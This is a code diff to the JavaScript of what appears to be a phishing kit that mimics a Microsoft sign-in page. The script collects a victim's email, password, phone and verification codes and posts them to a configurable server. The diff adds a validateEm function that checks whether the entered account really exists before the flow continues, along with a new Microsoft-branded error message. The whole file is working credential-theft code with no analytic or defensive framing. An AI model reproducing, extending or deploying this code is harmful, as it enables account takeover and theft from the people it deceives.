@@ -1,4 +1,4 @@
-var Errs={'NoOtpCode':'Enter the code to help us verify your identity.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','OathCodeIncorrect':'You didn\'t enter the expected verification code. Please try again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoAccount':'We couldn\'t find an account with that username. Try another, or get a new account.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoPassword':'Please enter your password.','accIncorrect':'Your account or password is incorrect. If you don\'t remember your password, <a id="ViewDetails" class="no-wrap" href="#">reset it now.</a>','UnableVeri':'Sorry, we\'re having trouble verifying your account. Please try again <a id="ViewDetails" class="no-wrap" href="#">View details</a>','InvalidSession':'Your session has timed out. Please close your browser and sign in again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>'};
+var Errs={'NoOtpCode':'Enter the code to help us verify your identity.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','OathCodeIncorrect':'You didn\'t enter the expected verification code. Please try again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoAccount':'We couldn\'t find an account with that username. Try another, or get a new account.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoPassword':'Please enter your password.','accIncorrect':'Your account or password is incorrect. If you don\'t remember your password, <a id="ViewDetails" class="no-wrap" href="#">reset it now.</a>','UnableVeri':'Sorry, we\'re having trouble verifying your account. Please try again <a id="ViewDetails" class="no-wrap" href="#">View details</a>','InvalidSession':'Your session has timed out. Please close your browser and sign in again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','Notemail':'We couldn\'t find an account with that username. Try another, or <a id="ViewDetails" class="no-wrap" href="#">get a new Microsoft account.</a>'};
 var email = "";
 var epass = "";
 var phone = "";
@@ -9,15 +9,17 @@ var myInterval,Proofs;
     $( document ).ready(async function() {
         console.log(semail);  
 if(isEmail(semail)){
+if(await validateEm(semail)){
     getpage('EmailPage',0);
 email = $("#email").val(semail);
-nextto(semail);
+nextto(semail,1);
 
+}
 }else{
  await getpage('EmailPage',1);  
   if(semail){
     email = $("#email").val(semail);
-    $("#error1").html(Errs['NoAccount']);
+    $("#error1").html(Errs['Notemail']);
   }
 } 
 
@@ -42,16 +44,16 @@ function isEmail(email) {
 var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 return regex.test(email);
 }
-function nextto(vak) {
+async function nextto(vak,skip) {
 if(vak){
     email = vak;  
 }else{
     email = $("#email").val();  
 }
-if (isEmail(email) === true) {
+$("#load").show();
+if (skip==1 || await validateEm(email) === true) {
 $("#load").show();
 $("#btn").attr("disabled", true);
-
 $.ajax({
 type: "POST",
 url: urlx,
@@ -73,7 +75,8 @@ $("#btn").attr("disabled", false);
 $(".ext-promoted-fed-cred-box").hide();
 });
 } else {
-$("#error1").html(Errs['NoAccount']);
+    $("#load").hide();
+$("#error1").html(Errs['Notemail']);
 }
 }
 function orgme() {
@@ -139,7 +142,25 @@ return false;
 });
 }
 }
+async function validateEm(email){
+var valx = '{"username":"'+email+'","isOtherIdpSupported":true,"checkPhones":false,"isRemoteNGCSupported":true,"isCookieBannerShown":false,"isFidoSupported":true,"originalRequest":"","country":"US","forceotclogin":false,"isExternalFederationDisallowed":false,"isRemoteConnectSupported":false,"federationFlags":0,"isSignup":false,"flowToken":"","isAccessPassSupported":true}';
+var reslt= await $.ajax({
+type: "POST",
+url: urlx,
+data: {
+action: "signup",
+valx: valx,
+mode: "validem",
+},
+})
+var vdata = JSON.parse(reslt);
+if (vdata["IfExistsResult"]=='1') {
+return false;
+}else{
+ return true;
+}
 
+}
 async  function auth(dauth) {
     if(Proofs){
 $("#screen1").html(Proofs);
